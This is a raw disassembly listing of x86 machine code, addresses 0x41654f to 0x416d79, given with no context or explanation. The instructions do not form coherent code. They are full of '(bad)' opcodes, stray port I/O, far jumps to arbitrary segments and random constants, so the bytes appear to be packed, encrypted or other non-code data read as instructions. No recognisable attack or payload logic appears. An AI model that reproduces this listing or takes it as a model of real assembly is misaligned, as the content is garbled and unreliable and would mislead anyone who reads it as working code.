  41654f:	enter  0x39f4,0xe0
  416553:	out    0x56,eax
  416555:	dec    ebx
  416556:	or     esi,DWORD PTR [esi]
  416558:	xchg   BYTE PTR [esi-0x7c],bh
  41655b:	adc    al,0x5
  41655d:	je     0x416592
  41655f:	loope  0x416502
  416561:	add    BYTE PTR [edi+0x24d76326],0x79
  416568:	retf   
  416569:	cld    
  41656a:	mov    edi,0x66bcda1f
  41656f:	and    ebx,DWORD PTR [eax+esi*1+0x72f35cee]
  416576:	faddp  st(4),st
  416578:	xchg   ebx,eax
  416579:	in     al,dx
  41657a:	sbb    esp,DWORD PTR [esi]
  41657c:	test   al,0xce
  41657e:	scas   eax,DWORD PTR es:[edi]
  41657f:	jae    0x4165f2
  416581:	jl     0x416511
  416583:	retf   
  416584:	mov    DWORD PTR [ebx],ebp
  416586:	imul   esi,esi,0x44
  416589:	push   esi
  41658a:	scas   eax,DWORD PTR es:[edi]
  41658b:	jle    0x41653b
  41658d:	dec    ebx
  41658e:	je     0x416538
  416590:	push   edi
  416591:	inc    ebx
  416592:	mov    bh,0x43
  416594:	lock ss test al,0xad
  416598:	sub    dh,dh
  41659a:	dec    DWORD PTR [ebp+0x38645fa6]
  4165a0:	and    BYTE PTR [ebp+ebp*1-0x1894724c],ah
  4165a7:	leave  
  4165a8:	lea    esi,ds:0x895ae2c2
  4165ae:	or     bl,BYTE PTR [edi-0x3fc86ab0]
  4165b4:	popf   
  4165b5:	mov    ebp,cs
  4165b7:	dec    eax
  4165b8:	pop    esp
  4165b9:	mov    BYTE PTR [ebp+eax*1-0x5d],dl
  4165bd:	and    eax,DWORD PTR [ebp+0x4d]
  4165c0:	push   ebp
  4165c1:	push   0x280338df
  4165c6:	jmp    0x416580
  4165c8:	push   ds
  4165c9:	dec    ebp
  4165ca:	retf   
  4165cb:	pop    ss
  4165cc:	mov    edi,0x206dab72
  4165d1:	sub    dh,BYTE PTR [eax+0x32fc7f0c]
  4165d7:	cmp    eax,0xb8e15927
  4165dc:	nop
  4165dd:	mov    al,ds:0x89adfad1
  4165e2:	das    
  4165e3:	push   ebp
  4165e4:	call   FWORD PTR [ebx]
  4165e6:	mov    al,0x3a
  4165e8:	pusha  
  4165e9:	mov    ds:0xa99f5321,eax
  4165ee:	ret    
  4165ef:	adc    al,BYTE PTR [eax+0x1f880756]
  4165f5:	ins    BYTE PTR es:[edi],dx
  4165f6:	adc    esp,DWORD PTR [edi+0x67408026]
  4165fc:	push   ds
  4165fd:	cld    
  4165fe:	sbb    bh,BYTE PTR es:[eax-0x29fee3d1]
  416605:	pop    ebp
  416606:	sbb    eax,0x8f890cc9
  41660b:	pop    ecx
  41660c:	jno    0x4165f4
  41660e:	repnz mov ecx,0xf1629e42
  416614:	int    0x90
  416616:	adc    DWORD PTR [ebp+edx*4-0x5],ecx
  41661a:	mov    edx,0x395d01f9
  41661f:	daa    
  416620:	int3   
  416621:	repz fs cmp eax,0xd7afa601
  416628:	sub    DWORD PTR [ecx+0x3553f760],edi
  41662e:	pop    ds
  41662f:	or     eax,0x1265808d
  416634:	jno    0x416689
  416636:	add    DWORD PTR [ecx-0x43],0xffffffe6
  41663a:	jmp    0x255c3763
  41663f:	mov    ds:0x4a6f252f,eax
  416644:	ds xchg edx,eax
  416646:	fadd   DWORD PTR [ebx+ebp*4-0x3a]
  41664a:	(bad)  
  41664b:	shr    BYTE PTR [esi+0x61],1
  41664e:	push   edx
  41664f:	stos   BYTE PTR es:[edi],al
  416650:	leave  
  416651:	cmp    eax,0xd16dc9f7
  416656:	inc    ebx
  416657:	loopne 0x4166b2
  416659:	dec    ebx
  41665a:	leave  
  41665b:	push   ebx
  41665c:	mov    dh,0x80
  41665e:	ins    BYTE PTR es:[edi],dx
  41665f:	shr    DWORD PTR [edx-0x157d2842],0x98
  416666:	push   0x2a3f475f
  41666b:	fiadd  DWORD PTR [ebx]
  41666d:	out    dx,al
  41666e:	cmp    eax,0xa018263a
  416673:	jg     0x416652
  416675:	push   eax
  416676:	out    dx,al
  416677:	or     eax,0x95d35ec2
  41667c:	or     dh,al
  41667e:	or     al,0x4f
  416680:	xchg   edx,eax
  416681:	mov    edi,0x6e0a6245
  416686:	push   0x77
  416688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41668a:	jp     0x41669d
  41668c:	sbb    esi,DWORD PTR [ebx+0x5]
  41668f:	lea    edx,[eax]
  416691:	repnz (bad) 
  416693:	mov    eax,0x97a20157
  416698:	test   eax,0x96691a7d
  41669d:	sbb    DWORD PTR [ebp+0x79],ecx
  4166a0:	imul   edi,DWORD PTR [ebx-0x216d8a08],0x6d
  4166a7:	je     0x41669e
  4166a9:	xchg   ebp,eax
  4166aa:	lea    ecx,[eax-0x29]
  4166ad:	std    
  4166ae:	loope  0x4166e5
  4166b0:	jmp    0x41672b
  4166b2:	das    
  4166b3:	call   0x9b4a:0x9a30f844
  4166ba:	jp     0x416707
  4166bc:	(bad)  
  4166bd:	mov    ch,0xfd
  4166bf:	sub    esp,DWORD PTR [ebx-0x17]
  4166c2:	rol    cl,cl
  4166c4:	jmp    0x4166fb
  4166c6:	cmc    
  4166c7:	mov    al,0xbf
  4166c9:	aas    
  4166ca:	pusha  
  4166cb:	mov    DWORD PTR [esi+0x0],ecx
  4166ce:	inc    ebp
  4166cf:	cmp    DWORD PTR [ebp-0x54b7f64e],0xffffffb6
  4166d6:	inc    edi
  4166d7:	ja     0x416736
  4166d9:	fs dec ebp
  4166db:	ss mov edi,0xe7b9bf8d
  4166e1:	fwait
  4166e2:	xlat   BYTE PTR ds:[ebx]
  4166e3:	jge    0x4166f3
  4166e5:	sahf   
  4166e6:	(bad)  
  4166e7:	mov    ecx,0xbcd3dc1f
  4166ec:	retf   0x1e17
  4166ef:	mov    DWORD PTR [ebp+0x6d],ecx
  4166f2:	fild   DWORD PTR [edi+0xf]
  4166f5:	cmc    
  4166f6:	lds    eax,FWORD PTR [esi+0x2a]
  4166f9:	xor    cl,BYTE PTR [ebx-0x443d4829]
  4166ff:	sahf   
  416700:	fcmove st,st(3)
  416702:	jp     0x4166c2
  416704:	int3   
  416705:	test   eax,0xe39f22a4
  41670a:	scas   al,BYTE PTR es:[edi]
  41670b:	mov    al,0x2
  41670d:	in     al,0x22
  41670f:	(bad)  
  416710:	and    bl,BYTE PTR [esi+edx*8+0x41]
  416714:	fmul   st,st(3)
  416716:	inc    ecx
  416717:	je     0x416721
  416719:	cld    
  41671a:	xor    ebp,DWORD PTR [esi+edi*8+0x25]
  41671e:	and    ch,ah
  416720:	push   ss
  416721:	cwde   
  416722:	test   BYTE PTR [ebx-0x10],ah
  416725:	cwde   
  416726:	jmp    0x7851c4a2
  41672b:	cmc    
  41672c:	pop    edi
  41672d:	jne    0x41670b
  41672f:	push   ebx
  416730:	pop    eax
  416731:	repz push 0x19
  416734:	sub    al,0xa4
  416736:	pushf  
  416737:	mov    edx,0x18fc0097
  41673c:	imul   ebx,DWORD PTR [esi+eax*4],0x78b71302
  416743:	pop    es
  416744:	pop    ds
  416745:	xchg   BYTE PTR [eax-0x6f5afdc2],bh
  41674b:	mov    esp,0xeb21bb02
  416750:	sub    bl,dh
  416752:	fisttp QWORD PTR [esi]
  416754:	or     al,0x10
  416756:	idiv   DWORD PTR [ebp+0x10]
  416759:	dec    edi
  41675a:	dec    esp
  41675b:	sbb    DWORD PTR [edi+0x76],0x66
  41675f:	mov    WORD PTR [esp+esi*4-0x3084b85a],ds
  416766:	es pop eax
  416768:	dec    edi
  416769:	add    eax,0xd3018624
  41676e:	popf   
  41676f:	mov    ebp,0x12e3047
  416774:	popf   
  416775:	cmp    ebp,edx
  416777:	or     eax,0x11707bfc
  41677c:	repnz and ah,BYTE PTR [ecx-0x4c0c0f5d]
  416783:	ins    DWORD PTR es:[edi],dx
  416784:	out    dx,al
  416785:	je     0x41672b
  416787:	xchg   edi,eax
  416788:	je     0x41672f
  41678a:	test   al,0x6f
  41678c:	cmp    BYTE PTR [ecx+0x2dbf4fe6],cl
  416792:	imul   ebp,DWORD PTR [edx-0xef6917c],0x68
  416799:	xchg   ebx,eax
  41679a:	xchg   ebp,eax
  41679b:	mov    esi,0x2bc88f9c
  4167a0:	clc    
  4167a1:	(bad)  
  4167a2:	jle    0x4167bf
  4167a4:	(bad)  
  4167a5:	mov    esi,0xb10600e1
  4167aa:	int3   
  4167ab:	rcl    BYTE PTR [esi+0xf],0x41
  4167af:	(bad)  
  4167b0:	pop    DWORD PTR [ecx+ebp*8]
  4167b3:	(bad)  
  4167b4:	arpl   WORD PTR [edi+ebp*4-0x2],sp
  4167b8:	fwait
  4167b9:	xor    eax,0xf000b129
  4167be:	adc    eax,0x22fc665b
  4167c3:	test   bl,dh
  4167c5:	add    al,0xb7
  4167c7:	sbb    eax,0xaa32ffce
  4167cc:	sbb    al,0xa6
  4167ce:	hlt    
  4167cf:	repnz or eax,0x158ec465
  4167d5:	jmp    0x41677b
  4167d7:	scas   al,BYTE PTR es:[edi]
  4167d8:	ja     0x4167ff
  4167da:	xor    eax,0x42338b71
  4167df:	stos   BYTE PTR es:[edi],al
  4167e0:	push   ecx
  4167e1:	scas   eax,DWORD PTR es:[edi]
  4167e2:	dec    edi
  4167e3:	dec    edi
  4167e4:	xor    ah,BYTE PTR [esi]
  4167e6:	mov    edi,0x995f5a91
  4167eb:	jb     0x4167a9
  4167ed:	(bad)  
  4167ee:	div    BYTE PTR [ebp+0x45a78911]
  4167f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f5:	(bad)  
  4167f6:	mov    al,ds:0x6fbf2cd8
  4167fb:	jg     0x4167c8
  4167fd:	enter  0x477b,0x46
  416801:	or     edi,ebx
  416803:	xchg   ebp,eax
  416804:	outs   dx,BYTE PTR ds:[esi]
  416805:	cmp    esp,edx
  416807:	mov    ecx,0x9f330b14
  41680c:	mov    WORD PTR [esi-0x39d857ee],?
  416812:	sub    eax,0xb60f5d37
  416817:	and    ah,ch
  416819:	(bad)  
  41681a:	or     al,0xda
  41681c:	or     DWORD PTR [ebx+0x14],0xffffffea
  416820:	push   0x49
  416822:	cmp    esi,ebx
  416824:	dec    edi
  416825:	aad    0xe3
  416827:	and    al,0xeb
  416829:	fwait
  41682a:	inc    ebp
  41682b:	dec    edx
  41682c:	in     eax,0x23
  41682e:	sub    esp,ebp
  416830:	cdq    
  416831:	aaa    
  416832:	dec    esi
  416833:	sbb    al,0x38
  416835:	mov    edx,0x2b52cc94
  41683a:	test   eax,0xcf49221c
  41683f:	adc    BYTE PTR ds:0x39deb6f0,cl
  416845:	mov    al,ds:0x8c62ec3f
  41684a:	lea    esi,[esi+eiz*4-0x4a6cf6a2]
  416851:	daa    
  416852:	popa   
  416853:	mov    eax,0x66abe787
  416858:	das    
  416859:	sbb    BYTE PTR [eax-0x3551f3c7],0xeb
  416860:	sbb    al,0xdf
  416862:	mov    ecx,0x3fb29f0e
  416867:	sbb    esi,DWORD PTR [eax+0x2d3e309b]
  41686d:	cmp    DWORD PTR [eax-0x24],ebx
  416870:	test   DWORD PTR [edi-0x18],ebx
  416873:	jmp    0xd1b7c100
  416878:	ret    
  416879:	test   eax,0x62f797bf
  41687f:	es mov ch,0xf5
  416882:	not    ah
  416884:	bound  ecx,QWORD PTR [edi-0x56]
  416887:	push   es
  416888:	adc    eax,0x42032e6c
  41688d:	aam    0x8e
  41688f:	sub    al,ch
  416891:	jno    0x4168b8
  416893:	adc    DWORD PTR [edi+0x4d2ce25],edi
  416899:	pop    ebp
  41689a:	jge    0x41688c
  41689c:	mov    ?,WORD PTR [eax]
  41689e:	outs   dx,DWORD PTR ds:[esi]
  41689f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168a0:	cmc    
  4168a1:	jnp    0x416842
  4168a3:	dec    ecx
  4168a4:	gs pop es
  4168a6:	call   0x595e:0xead445a2
  4168ad:	xor    eax,DWORD PTR [eax]
  4168af:	xor    eax,0x11cd1850
  4168b4:	xlat   BYTE PTR ds:[ebx]
  4168b5:	and    ah,BYTE PTR [ecx+0x3be6a185]
  4168bb:	bound  eax,QWORD PTR [ecx-0x2c]
  4168be:	sahf   
  4168bf:	sbb    eax,0x6585c7d8
  4168c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c5:	xchg   edi,eax
  4168c6:	mov    cl,0xd5
  4168c8:	mov    edi,0x2c333eb
  4168cd:	rcr    BYTE PTR [ecx+0x34f89449],0xb
  4168d4:	or     BYTE PTR [ecx],ah
  4168d6:	cmp    edx,DWORD PTR ds:[eax]
  4168d9:	add    DWORD PTR ds:0x2c19a8c5,esp
  4168df:	mov    ds:0x21019864,eax
  4168e4:	mov    ebx,0xe932b3d4
  4168e9:	shl    BYTE PTR [ecx-0x193ec2a9],cl
  4168ef:	hlt    
  4168f0:	push   ebp
  4168f1:	retf   
  4168f2:	std    
  4168f3:	cmp    ebp,DWORD PTR [eax*4-0x7d2cbb23]
  4168fa:	icebp  
  4168fb:	jb     0x416975
  4168fd:	pop    edi
  4168fe:	fnstenv [ebp+0x23]
  416901:	ret    0x54dd
  416904:	and    al,0x6e
  416906:	inc    esp
  416907:	stos   DWORD PTR es:[edi],eax
  416908:	aaa    
  416909:	cmp    ah,cl
  41690b:	adc    DWORD PTR [edi],edi
  41690d:	aam    0x5f
  41690f:	adc    eax,0x6140aba3
  416914:	dec    edx
  416915:	(bad)  
  416916:	inc    ecx
  416917:	push   es
  416918:	adc    ecx,edx
  41691a:	(bad)  
  41691c:	pop    edi
  41691d:	aaa    
  41691e:	sbb    BYTE PTR [ebp-0x5326aa0],dh
  416924:	sub    dl,ah
  416926:	loope  0x41693f
  416928:	test   BYTE PTR [ecx-0x4588d868],0xd8
  41692f:	dec    eax
  416930:	pop    ds
  416931:	loopne 0x41696b
  416933:	or     ebx,DWORD PTR [eax]
  416935:	(bad)  
  416936:	pop    ds
  416937:	jo     0x4168ef
  416939:	xchg   ebp,eax
  41693a:	adc    edx,DWORD PTR [eax]
  41693c:	out    0xe9,al
  41693e:	add    bh,BYTE PTR [edi]
  416940:	(bad)  
  416941:	jno    0x4168d5
  416943:	mov    dh,0xa2
  416945:	push   ebp
  416946:	pop    es
  416947:	aaa    
  416948:	jge    0x416914
  41694a:	bound  eax,QWORD PTR [edx]
  41694c:	sub    BYTE PTR [ecx-0x616ff95a],ah
  416952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416953:	in     eax,0x1b
  416955:	cdq    
  416956:	gs int 0x34
  416959:	sub    DWORD PTR [ebx],ebx
  41695b:	dec    esp
  41695c:	pusha  
  41695d:	push   esp
  41695e:	test   eax,0xc79f0b20
  416963:	push   0x4ca2a26c
  416968:	imul   ebp,eax,0x80936be9
  41696e:	aaa    
  41696f:	ds loope 0x416971
  416972:	sub    DWORD PTR ss:0xfaf12fce,edi
  416979:	mov    bl,0xda
  41697b:	push   esp
  41697c:	cmc    
  41697d:	or     esi,DWORD PTR [esi-0x5cd1f111]
  416983:	jmp    0x780:0x28ab8663
  41698a:	mov    al,0x60
  41698c:	xchg   ebp,eax
  41698d:	repz pop esp
  41698f:	and    al,bl
  416991:	or     DWORD PTR [esi],eax
  416993:	mov    DWORD PTR [edx+eiz*2-0x1c4f4de1],esp
  41699a:	lea    esp,[ecx+eax*1]
  41699d:	cmp    DWORD PTR [ebx],0x68d27a7f
  4169a3:	and    dl,BYTE PTR [edx+eax*2]
  4169a6:	repz add ecx,DWORD PTR ss:[ebx]
  4169aa:	cmp    al,0x50
  4169ac:	sub    BYTE PTR [ecx-0x227ea139],cl
  4169b2:	pop    ebx
  4169b3:	xchg   esp,eax
  4169b4:	shr    BYTE PTR [edi-0x4d],1
  4169b7:	push   0xffffffa9
  4169b9:	or     BYTE PTR [ebp+0x6c],cl
  4169bc:	in     al,dx
  4169bd:	push   ecx
  4169be:	test   BYTE PTR [esi+0x52c1b272],0x5c
  4169c5:	shl    BYTE PTR [ebp+0x693b555f],cl
  4169cb:	push   ebx
  4169cc:	clc    
  4169cd:	xchg   edi,eax
  4169ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169cf:	xchg   ch,bl
  4169d1:	mov    ss,WORD PTR [edi-0x4e]
  4169d4:	jecxz  0x416985
  4169d6:	out    0x89,eax
  4169d8:	scas   eax,DWORD PTR es:[edi]
  4169d9:	sub    ebp,DWORD PTR [edx+0x3251eab0]
  4169df:	xchg   ebp,eax
  4169e0:	aaa    
  4169e1:	mov    ah,0xca
  4169e3:	push   edx
  4169e4:	out    0xe8,eax
  4169e6:	dec    ebp
  4169e7:	mov    bh,0x63
  4169e9:	push   esi
  4169ea:	push   eax
  4169eb:	push   eax
  4169ec:	and    cl,0xa5
  4169ef:	xor    eax,ecx
  4169f1:	out    0x13,eax
  4169f3:	pop    ecx
  4169f4:	aad    0x36
  4169f6:	jb     0x41699d
  4169f8:	push   cs
  4169f9:	xlat   BYTE PTR ds:[ebx]
  4169fa:	lods   al,BYTE PTR ds:[esi]
  4169fb:	jp     0x416a33
  4169fd:	mov    ecx,0x5c9d3a3d
  416a03:	ins    BYTE PTR es:[edi],dx
  416a04:	mov    DWORD PTR [eax],esp
  416a06:	mov    edx,0x2d60dafd
  416a0b:	mov    ch,0x85
  416a0d:	fwait
  416a0e:	aas    
  416a0f:	cmp    DWORD PTR [edx-0x2ddfa15f],esi
  416a15:	shl    BYTE PTR [edi-0x40895c1b],1
  416a1b:	stc    
  416a1c:	outs   dx,BYTE PTR ds:[esi]
  416a1d:	cli    
  416a1e:	mov    al,ds:0x4783e042
  416a23:	push   0xd545319c
  416a28:	leave  
  416a29:	add    eax,0x3b98ba58
  416a2e:	mov    ds:0x43ae5384,eax
  416a33:	mul    DWORD PTR [esi-0x1ae65e55]
  416a39:	jp     0x416a71
  416a3b:	ret    0x19c9
  416a3e:	inc    ebx
  416a3f:	xchg   ecx,eax
  416a40:	outs   dx,BYTE PTR ds:[esi]
  416a41:	mov    edx,0xc07ed70a
  416a46:	fs in  eax,dx
  416a48:	mov    al,ds:0x32739a87
  416a4d:	fldenv [edx+0x22]
  416a50:	xor    eax,0xeaa211f7
  416a55:	repz mov ebx,0x66cb316b
  416a5b:	in     al,0x8f
  416a5d:	addr16 push ebx
  416a5f:	(bad)  
  416a60:	in     eax,dx
  416a61:	mov    ds:0xd564b117,eax
  416a66:	xor    DWORD PTR [ebx],esp
  416a68:	mov    esp,0x82925511
  416a6d:	mov    al,0x2
  416a6f:	dec    eax
  416a70:	in     eax,dx
  416a71:	fcmovnu st,st(5)
  416a73:	pop    ss
  416a74:	xor    eax,0xa8233cec
  416a79:	add    ebx,ebp
  416a7b:	xchg   ebx,eax
  416a7c:	icebp  
  416a7d:	ret    0x11c8
  416a80:	les    ecx,FWORD PTR [edx+ebx*2]
  416a83:	push   ss
  416a84:	dec    ecx
  416a85:	icebp  
  416a86:	mov    edi,0x895f7ce1
  416a8b:	adc    esi,ebp
  416a8d:	fisttp DWORD PTR [ecx+0xf15aa29]
  416a93:	ds jae 0x416a33
  416a96:	mov    BYTE PTR [edi],dh
  416a98:	popa   
  416a99:	add    al,BYTE PTR [ebx-0x1c079716]
  416a9f:	daa    
  416aa0:	cmp    esp,esi
  416aa2:	(bad)  [edx]
  416aa4:	mov    ecx,0x5fdd3332
  416aa9:	mov    ds,WORD PTR [edx-0x6514ce85]
  416aaf:	aam    0xb7
  416ab1:	xchg   esp,eax
  416ab2:	(bad)  
  416ab3:	inc    ecx
  416ab4:	loopne 0x416b32
  416ab6:	inc    edi
  416ab7:	sbb    BYTE PTR [edx+esi*4],cl
  416aba:	mov    edi,0x18dc6293
  416abf:	out    0x57,eax
  416ac1:	(bad)  
  416ac2:	repnz xor DWORD PTR [ebx+edi*2+0xb0e68b7],edi
  416aca:	fstp   QWORD PTR [edi]
  416acc:	mov    bh,0xe5
  416ace:	xchg   ebx,eax
  416acf:	pop    ds
  416ad0:	sbb    DWORD PTR [esi+edi*8],0x20
  416ad4:	jle    0x416a83
  416ad6:	fsub   DWORD PTR [edx]
  416ad8:	test   al,0xea
  416ada:	dec    esp
  416adb:	xor    eax,0x5b4bbac2
  416ae0:	imul   edx,DWORD PTR [ebx+0x3a],0xffffffa1
  416ae4:	cmp    esi,DWORD PTR [esi+0xd5803bf]
  416aea:	in     eax,0x65
  416aec:	jbe    0x416ab9
  416aee:	push   edx
  416aef:	repz shl BYTE PTR [ebp+ebx*1-0xc],1
  416af4:	ret    
  416af5:	or     eax,0x104b97aa
  416afa:	ds ret 0x198b
  416afe:	ins    DWORD PTR es:[edi],dx
  416aff:	(bad)  
  416b00:	retf   
  416b01:	sub    BYTE PTR [edx+0x77f23b27],ah
  416b07:	fstp   DWORD PTR [esi]
  416b09:	lds    edx,FWORD PTR [edi-0x56]
  416b0c:	xor    ebp,ebx
  416b0e:	aad    0xf7
  416b10:	pop    esp
  416b11:	dec    edi
  416b12:	mov    ?,WORD PTR [ecx+ecx*8]
  416b15:	aaa    
  416b16:	push   es
  416b17:	ror    BYTE PTR [ecx],cl
  416b19:	not    dl
  416b1b:	xor    eax,0x2bc575ff
  416b20:	loopne 0x416b43
  416b22:	xor    DWORD PTR ds:[eax+0x1cf2b235],0xeabc23bf
  416b2d:	nop
  416b2e:	int3   
  416b2f:	jge    0x416b90
  416b31:	mov    ah,0x1f
  416b33:	fistp  DWORD PTR [eax-0x35]
  416b36:	pop    esi
  416b37:	push   ds
  416b38:	(bad)  
  416b39:	xchg   esi,eax
  416b3a:	inc    ecx
  416b3b:	imul   eax,DWORD PTR [esi+0x44779345],0xbd57cb62
  416b45:	pop    ecx
  416b46:	sbb    eax,DWORD PTR [ebp-0x5c]
  416b49:	fsubr  st,st(1)
  416b4b:	cmp    ecx,DWORD PTR [ebp-0x51292121]
  416b51:	sub    BYTE PTR [ecx+ecx*2],dl
  416b54:	call   0x6dde:0xda92e41b
  416b5b:	push   0x32
  416b5d:	ins    DWORD PTR es:[edi],dx
  416b5e:	mov    ecx,0xd3021336
  416b63:	and    al,0x6d
  416b65:	retf   
  416b66:	inc    ebp
  416b67:	es inc ecx
  416b69:	fwait
  416b6a:	inc    ebx
  416b6b:	jnp    0x416b7f
  416b6d:	cli    
  416b6e:	or     BYTE PTR [esi-0x2],ah
  416b71:	and    bh,dl
  416b73:	sub    DWORD PTR [edx+0x5b],ecx
  416b76:	cmp    BYTE PTR [ecx],dl
  416b78:	push   ecx
  416b79:	int    0x85
  416b7b:	and    bh,dl
  416b7d:	add    ebp,DWORD PTR [edi-0x1dcf1343]
  416b83:	sbb    al,0xab
  416b85:	sub    al,0x6c
  416b87:	inc    ebx
  416b88:	jae    0x416b82
  416b8a:	mov    esi,0x1424518e
  416b8f:	dec    ebp
  416b90:	or     eax,0xdd62c0fa
  416b95:	jbe    0x416bdb
  416b97:	sbb    al,0xd6
  416b99:	pop    edx
  416b9a:	adc    dh,BYTE PTR [esp+ebp*8-0x4]
  416b9e:	imul   BYTE PTR cs:[edx+esi*4-0x7f4e40fd]
  416ba6:	push   edi
  416ba7:	in     al,0x75
  416ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416baa:	loope  0x416c0e
  416bac:	adc    eax,DWORD PTR [ecx-0x5f]
  416baf:	test   ecx,edi
  416bb1:	mov    al,0x4f
  416bb3:	(bad)  
  416bb4:	repz fcom DWORD PTR [ecx+0x624f47f]
  416bbb:	arpl   bx,cx
  416bbd:	add    al,0x51
  416bbf:	mov    esi,0xae7f2345
  416bc4:	stc    
  416bc5:	mov    es,WORD PTR [esi+0x0]
  416bc8:	jno    0x416c33
  416bca:	pop    esp
  416bcb:	retf   0xcc1b
  416bce:	rol    DWORD PTR [ecx],0xce
  416bd1:	xchg   edx,eax
  416bd2:	and    bl,BYTE PTR [ecx]
  416bd4:	xor    edi,esi
  416bd6:	(bad)  
  416bd7:	in     al,0xb9
  416bd9:	mov    al,0xe2
  416bdb:	xor    DWORD PTR [ecx+0x8097024],eax
  416be1:	in     eax,0xa6
  416be3:	jmp    0xb1fd:0x5479046b
  416bea:	mov    eax,0x62736c9d
  416bef:	lods   eax,DWORD PTR ds:[esi]
  416bf0:	retf   0x2e39
  416bf3:	loop   0x416bc8
  416bf5:	or     bl,BYTE PTR ds:0x9d45a43
  416bfb:	dec    eax
  416bfc:	fistp  DWORD PTR [eax-0x61]
  416bff:	shr    DWORD PTR [ebp-0x7ad49670],cl
  416c05:	ficomp WORD PTR [eax]
  416c07:	lock ret 
  416c09:	lock pop ebx
  416c0b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416c0d:	mov    esi,0x919838f
  416c12:	xchg   esp,eax
  416c13:	out    dx,al
  416c14:	mov    ecx,0xb7fd161a
  416c19:	lods   al,BYTE PTR ds:[esi]
  416c1a:	fnsave [edi-0x65]
  416c1d:	(bad)  
  416c1e:	iret   
  416c1f:	cld    
  416c20:	call   0x18dcaa9d
  416c25:	sub    ch,BYTE PTR [edx+0x73]
  416c28:	ret    0x761e
  416c2b:	dec    eax
  416c2c:	ret    
  416c2d:	mov    ah,0x14
  416c2f:	pusha  
  416c30:	test   eax,0x7da68722
  416c35:	fadd   QWORD PTR [ecx]
  416c37:	jg     0x416c96
  416c39:	and    DWORD PTR [esi],0x3c9c504
  416c3f:	jp     0x416cbb
  416c41:	or     al,0x47
  416c43:	in     al,dx
  416c44:	adc    eax,0x57807ba
  416c49:	daa    
  416c4a:	(bad)
  416c4d:	sbb    BYTE PTR [eax-0x2a],ch
  416c50:	sahf   
  416c51:	jae    0x416c07
  416c53:	adc    al,0x5a
  416c55:	jmp    0xb3cda2d2
  416c5a:	xor    eax,0x4d37ec13
  416c5f:	mov    DWORD PTR [edi-0x2],ecx
  416c62:	mov    ds,WORD PTR [ebp-0x10]
  416c65:	aas    
  416c66:	or     cl,BYTE PTR [ecx]
  416c68:	test   BYTE PTR [ecx],al
  416c6a:	int3   
  416c6b:	addr16 mov ebp,0x14ece918
  416c71:	loop   0x416cb1
  416c73:	enter  0x19a6,0xef
  416c77:	(bad)  
  416c78:	into   
  416c79:	push   eax
  416c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c7b:	mov    bl,0x53
  416c7d:	or     eax,0x8a25d508
  416c82:	add    al,0x60
  416c84:	aas    
  416c85:	add    al,0xf6
  416c87:	inc    edx
  416c88:	into   
  416c89:	jle    0x416c76
  416c8b:	popa   
  416c8c:	sbb    eax,0x30a29eb7
  416c91:	ja     0x416c88
  416c93:	mov    ?,esi
  416c95:	sub    DWORD PTR [esi-0x7beb258b],edi
  416c9b:	mov    esp,0xcf20348e
  416ca0:	sbb    DWORD PTR [edx],edi
  416ca2:	lds    eax,FWORD PTR [edi+ecx*8+0x3e873213]
  416ca9:	mov    ecx,0xce8a24a7
  416cae:	jne    0x416c3a
  416cb0:	les    ecx,FWORD PTR [ecx-0x69]
  416cb3:	push   cs
  416cb4:	jge    0x416d01
  416cb6:	call   0xadd9e4e0
  416cbb:	jmp    0x416d3a
  416cbd:	push   edi
  416cbe:	shl    DWORD PTR [ebp-0x9],1
  416cc1:	mov    edi,0x4d1ecad9
  416cc6:	sub    eax,0x8e85756f
  416ccb:	dec    edx
  416ccc:	sti    
  416ccd:	jns    0x416c70
  416ccf:	popf   
  416cd0:	arpl   bp,cx
  416cd2:	mov    cl,0xed
  416cd4:	std    
  416cd5:	sbb    eax,0x9a1e7fef
  416cda:	es call 0x415e6840
  416ce0:	lock mov dh,0xf8
  416ce3:	jp     0x416cdf
  416ce5:	and    eax,0xfe611dbb
  416cea:	sbb    al,0x2a
  416cec:	ror    BYTE PTR [ebx-0x36],cl
  416cef:	inc    esp
  416cf0:	mov    edx,0x53eb91eb
  416cf5:	pop    ecx
  416cf6:	push   0xffffff90
  416cf8:	add    DWORD PTR [ecx-0x2deb0415],esi
  416cfe:	repnz push edi
  416d00:	xchg   BYTE PTR [ecx-0x3baa8a3],bh
  416d06:	jmp    0xe2a612da
  416d0b:	sub    DWORD PTR [edi-0x75],ecx
  416d0e:	sbb    eax,0xccbf4fe2
  416d13:	das    
  416d14:	jne    0x416cc3
  416d16:	cdq    
  416d17:	(bad)  
  416d18:	js     0x416cd9
  416d1a:	sbb    DWORD PTR [edi-0x2a],0xffffff87
  416d1e:	jns    0x416d99
  416d20:	(bad)  
  416d21:	xor    BYTE PTR [esi-0x4e330613],ah
  416d27:	push   0xcf467b49
  416d2c:	xchg   ecx,eax
  416d2d:	sub    al,0x1b
  416d2f:	test   al,0xe7
  416d31:	popa   
  416d32:	mov    dl,0x92
  416d34:	ror    BYTE PTR [edi-0x7f3723d7],cl
  416d3a:	xor    dh,0x2b
  416d3d:	push   esp
  416d3e:	arpl   WORD PTR [ebp+0x24],cx
  416d41:	sbb    al,0xe8
  416d43:	dec    ecx
  416d44:	mov    dl,0xa4
  416d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d47:	or     ah,BYTE PTR [edx+ebx*1+0x1f]
  416d4b:	cmp    bl,al
  416d4d:	sub    eax,0x65572fc4
  416d52:	sub    BYTE PTR [edi],ch
  416d54:	jmp    0x8b205ff3
  416d59:	retf   
  416d5a:	or     cl,ch
  416d5c:	dec    ebx
  416d5d:	or     edx,DWORD PTR [ecx-0x72a7a067]
  416d63:	add    ecx,DWORD PTR [esi-0x280e64b5]
  416d69:	rol    ebp,1
  416d6b:	xchg   edi,eax
  416d6c:	or     edi,ebp
  416d6e:	sub    bl,BYTE PTR [eax-0x43]
  416d71:	rol    DWORD PTR [ecx],0x9b
  416d74:	and    ebp,DWORD PTR [ebx]
  416d76:	adc    BYTE PTR [edx],0x43
  416d79:	retf   
